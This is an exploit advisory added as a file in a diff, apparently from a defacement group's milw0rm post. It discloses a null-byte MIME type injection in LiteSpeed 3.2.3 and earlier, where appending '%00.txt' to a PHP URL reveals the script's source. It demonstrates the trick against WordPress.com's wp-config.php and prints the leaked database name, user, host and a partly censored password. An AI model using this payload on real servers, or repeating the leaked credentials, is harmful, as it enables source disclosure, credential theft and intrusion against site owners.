@@ -1,0 +1,75 @@
+########################################################################################
+###########  _______ __           _____         ___                      __  ###########
+########### |_     _|  |--.-----.|     \.-----.'  _|.---.-.----.-----.--|  | ###########
+###########   |   | |     |  -__||  --  |  -__|   _||  _  |  __|  -__|  _  | ###########
+###########   |___| |__|__|_____||_____/|_____|__|  |___._|____|_____|_____| ###########
+###########                                                                  ###########
+###########                           TheDefaced.org                         ###########
+###########             TheDefaced Security Team Presents An 0-day.          ###########
+###########                  LiteSpeed Remote Mime Type Injection            ###########
+###########                     Discovered by:Tr3mbl3r                       ###########
+###########                Shouts to his kitty kats and tacos.               ###########
+########################################################################################
+# Product:                                                                             #
+# LiteSpeed/Discovered in <==3.2.3 Should work in all other versions below.            #                                                                          
+#                                                                                      #
+# Vuln:                                                                                #
+# Remote Mime Type Injection                                                           #
+#                                                                                      #
+# Description:                                                                         #
+# Litespeed will parse an URL/Files mimetype incorrectly.                              #
+# When given a nullbyte.                                                               #
+#                                                                                      #
+# Patch:                                                                               #
+# Upgrade to LiteSpeed 3.2.4 has just been released today.                             #
+# 9:15AM PST OCT 22 When I wrote this it's now 9:30AM PST OCT 22                       #
+#                                                                                      #
+# This vuln was found before an update was released they fixed it after they found it..#
+# In their logs.                                                                       #
+#                                                                                      #
+# Risk: Extremely High                                                                 #
+########################################################################################
+# Example:                                                                             # 
+# Basicly if you had a URL like so http://www.site.com/index.php.                      #
+# And you wanted this websites source you could simply add a nullbyte and an extension #
+# Like So http://www.site.com/index.php%00.txt                                         #
+# Litespeed would then at this point asume the file is a txt file.                     #
+#                                                                                      #
+# Keep in mind that this vuln is Mime Type Injection... so it works with any type.     #
+# Like if you did %00.rar it would asume the index.php was a rar file.                 #
+# Theres a numerous ammount of things you could do.                                    #
+#                                                                                      #
+# As to of why litespeed does this is not confirmed by us just yet.                    #
+#                                                                                      #
+# I asume it has somthing to do with mimetype handling thus the name of the exploit.   #
+# MimeType Injection.                                                                  #
+########################################################################################
+#               An Example of This Vuln being put in to use.                           #
+#                                                                                      #            
+#               The Following is WordPress.com's Wp-Config.php                         #
+#                   http://wordpress.com/wp-config.php%00.txt                          #
+########################################################################################
+#                                                                                      ###########
+# <?php                                                                                          #
+#                                                                                                #
+# // This is probably useless?                                                                   #
+# define('DB_NAME', 'wpmu');     // The name of the database                                     #
+# define('DB_USER', 'wpmu');     // Your MySQL username                                          #
+# define('DB_PASSWORD', 'JTO5T**CENSOR-HERE**'); // ...and password                              # 
+# define('DB_HOST', 'two.wordpress.com');     // 99% chance you won't need to change this value  #
+#                                                                                                #
+# require('define.php');                                                                         #        
+#                                                                                                #
+# require(ABSPATH . 'wpmu-settings.php');                                                        #
+#                                                                                                # 
+# ?>                                                                                             #
+#                                                                                                #
+##################################################################################################
+#                                           Contact Us                                           #
+##################################################################################################
+# WebSite: http://www.thedefaced.org                                                             #
+# Forums for more info: http://www.thedefaced.org/forums/                                        #
+# IRC: irc.thedefaced.org/#TheDefaced                                                            #
+##################################################################################################
+
+# milw0rm.com [2007-10-22]
